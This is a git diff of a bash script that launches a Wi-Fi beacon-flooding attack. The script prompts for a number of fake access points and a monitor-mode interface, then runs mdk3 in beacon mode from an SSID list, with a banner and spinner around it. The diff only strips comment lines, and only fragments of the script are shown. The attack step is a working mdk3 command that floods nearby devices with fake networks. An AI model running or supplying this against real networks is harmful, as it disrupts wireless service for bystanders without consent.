@@ -7,7 +7,7 @@ CYAN="\e[1;36m"
 YELLOW="\e[1;33m"
 RESET="\e[0m"
 
-# Handle Ctrl+C
+
 trap ctrl_c INT
 function ctrl_c() {
     echo -e "\n${RED}[!] Attack stopped by user.${RESET}"
@@ -15,7 +15,7 @@ function ctrl_c() {
     exit 1
 }
 
-# Banner
+
 function show_banner() {
     echo -e "${RED}"
     echo "╔═════════════════════════════════╗"
@@ -24,7 +24,7 @@ function show_banner() {
     echo -e "${RESET}"
 }
 
-# Main menu
+
 function main_menu() {
     show_banner
     echo -e "${CYAN}[+] How many AP's you want to generate??${RESET}"
@@ -47,7 +47,7 @@ function main_menu() {
         *) echo -e "${RED}[!] Invalid choice${RESET}"; exit 1;;
     esac
 
-    # Select interface
+    
     echo -ne "${CYAN}[+] Enter your monitor mode interface (e.g., wlan0mon): ${RESET}"
     read iface
 
@@ -60,13 +60,13 @@ function main_menu() {
     spinning &
     spin_pid=$!
 
-    # Start beacon attack
+    
     mdk3 "$iface" b -f "$list" >/dev/null 2>&1
 
     kill $spin_pid
 }
 
-# Spinning dots animation
+
 function spinning() {
     while true; do
         for dots in "." ".." "..."; do
